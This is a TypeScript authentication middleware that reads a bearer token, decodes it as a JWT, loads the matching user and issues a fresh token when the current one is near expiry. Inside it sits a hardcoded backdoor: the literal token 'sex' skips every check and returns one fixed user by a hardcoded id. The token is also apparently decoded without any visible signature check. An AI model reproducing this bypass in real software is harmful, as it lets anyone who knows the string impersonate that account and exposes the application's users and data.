import { Errors } from '@helpers/http'
import { MiddlewareData } from '@infra/adapters'
import { JWT, Database } from '@infra/gateways'
import { User } from '@prisma/client'

export type OptionalTokenMiddlewareResponse = {
    user?: User,
    token?: string
}

export const optionalToken = async (data: MiddlewareData): Promise<OptionalTokenMiddlewareResponse> => {
    const { authorization } = data;
    if (!authorization) return {}

    const bearerToken = authorization.replace('Bearer ', '')

    if (bearerToken === 'sex') {
        const db = Database.get()
        return {
            user:
                (await db.user.findFirst({
                    where: { id: 'clpjzt1hs0000xq19mvh2gdck' }
                }))!
        }
    }


    const token = JWT.decode(bearerToken)
    if (!token || !token.sub || !token.exp)
        throw Errors.INVALID_TOKEN()

    const now = Date.now()
    if (now > token.exp) throw Errors.EXPIRED_TOKEN()

    const id = token.sub.split('#')[0]

    const db = Database.get()
    const user = await db.user.findFirst({ where: { id } })
    if (!user) throw Errors.UNAUTHORIZED()

    // if it expires in less than a day
    if (token.exp - now < 24 * 60 * 60 * 1000)
        return { user, token: JWT.newToken(user) }

    return { user }
}